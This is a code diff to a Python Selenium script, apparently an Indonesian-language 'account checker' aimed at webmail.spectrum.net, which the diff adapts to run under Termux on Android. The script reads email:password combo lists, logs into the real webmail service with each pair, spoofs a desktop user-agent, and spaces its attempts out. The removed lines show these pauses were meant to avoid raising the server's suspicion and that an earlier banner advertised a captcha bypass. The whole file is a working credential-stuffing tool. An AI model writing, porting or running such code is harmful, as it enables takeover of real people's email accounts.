@@ -4,6 +4,7 @@ from datetime import datetime
 from colorama import Fore, init
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service  # PENTING: Import Service untuk Termux
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
@@ -29,36 +30,40 @@ class ValosintSelenium:
         print(f"{Fore.CYAN}  ████   ██   ██ ███████  ██████  ███████ ██ ██   ████    ██    ")
         print("")
         print(f"               {Fore.WHITE}spectrum_account_checker • VALOSINT SCRIPT")
-        print(f"              {Fore.CYAN}◇ SELENIUM ENGINE ◇ ANTI-CAPTCHA BYPASS ◇")
+        print(f"              {Fore.CYAN}◇ SELENIUM ENGINE ◇ TERMUX EDITION ◇")
         print("")
         print(f"                         {Fore.BLUE}╭──────────────╮")
         print(f"                         {Fore.CYAN}│ {Fore.WHITE}PROJECT_VALO {Fore.CYAN}│")
         print(f"                         {Fore.BLUE}╰──────────────╯")
         print(f"{Fore.BLUE}──────────────────────────────────────────────────────────────────────")
         print(f"{Fore.GREEN}Target      {Fore.WHITE}: webmail.spectrum.net")
-        print(f"{Fore.GREEN}Engine      {Fore.WHITE}: Chromium WebDriver (Headless)")
-        print(f"{Fore.GREEN}Script Name {Fore.WHITE}: spectrum_checker_SELENIUM_V1")
+        print(f"{Fore.GREEN}Engine      {Fore.WHITE}: Chromium WebDriver (Termux Headless)")
+        print(f"{Fore.GREEN}Script Name {Fore.WHITE}: spectrum_checker_TERMUX_V2")
         print(f"{Fore.GREEN}Started At  {Fore.WHITE}: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
         print(f"{Fore.BLUE}──────────────────────────────────────────────────────────────────────")
 
     def setup_driver(self):
-        # Konfigurasi khusus agar Chrome bisa jalan di Termux HP tanpa error
         chrome_options = Options()
         chrome_options.add_argument("--headless") # Jalan di latar belakang
         chrome_options.add_argument("--no-sandbox") # Wajib untuk Linux/Termux
         chrome_options.add_argument("--disable-dev-shm-usage") # Mengatasi limitasi memori HP
         chrome_options.add_argument("--disable-gpu")
-        chrome_options.add_argument("--window-size=1920,1080") # Resolusi Desktop
         chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
         
-        # Inisialisasi WebDriver
-        return webdriver.Chrome(options=chrome_options)
+        # [PENTING] Jalur khusus Chromium versi Termux
+        chrome_options.binary_location = "/data/data/com.termux/files/usr/bin/chromium-browser"
+        
+        # [PENTING] Jalur khusus Chromedriver versi Termux
+        service = Service("/data/data/com.termux/files/usr/bin/chromedriver")
+        
+        # Inisialisasi WebDriver dengan Service khusus Termux
+        return webdriver.Chrome(service=service, options=chrome_options)
 
     def check_account(self, credential):
         if ":" not in credential: return
         email, password = credential.split(":")
         
-        print(f"{Fore.YELLOW}[*] {self._get_time()} | Membuka browser untuk {email}...")
+        print(f"{Fore.YELLOW}[*] {self._get_time()} | Membuka browser untuk {email[:15]}...")
         
         driver = None
         try:
@@ -118,8 +123,8 @@ class ValosintSelenium:
                 self.error_count += 1
 
         except Exception as e:
-            # Jika internet lambat atau web tidak meload
-            print(f"{Fore.YELLOW}[{self._get_time()}] [ERROR] {email[:15]}... | Page Timeout / Element Not Found")
+            # Jika internet lambat, web tidak meload, atau driver gagal
+            print(f"{Fore.YELLOW}[{self._get_time()}] [ERROR] {email[:15]}... | {str(e)[:50]}...")
             self.error_count += 1
             
         finally:
@@ -133,7 +138,7 @@ class ValosintSelenium:
         combo_file = input(f"{Fore.WHITE}[?] Input Combo File [{Fore.CYAN}Enter for 'combo.txt'{Fore.WHITE}]: ").strip() or "combo.txt"
         
         print(f"\n{Fore.BLUE}──────────────────────────────────────────────────────────────────────")
-        print(f"{Fore.YELLOW}[*] {Fore.WHITE}Initializing Selenium Webdriver...")
+        print(f"{Fore.YELLOW}[*] {Fore.WHITE}Initializing Termux Chromium Webdriver...")
         
         if not os.path.exists(combo_file):
             print(f"{Fore.RED}[!] {Fore.WHITE}System halt: Combo file '{combo_file}' not found.")
@@ -155,7 +160,6 @@ class ValosintSelenium:
         # Eksekusi Checker 1 per 1 (Single Thread agar Termux kuat)
         for acc in accounts:
             self.check_account(acc)
-            # Jeda antar akun agar server tidak curiga
             time.sleep(2)
 
         print(f"\n{Fore.BLUE}──────────────────────────────────────────────────────────────────────")
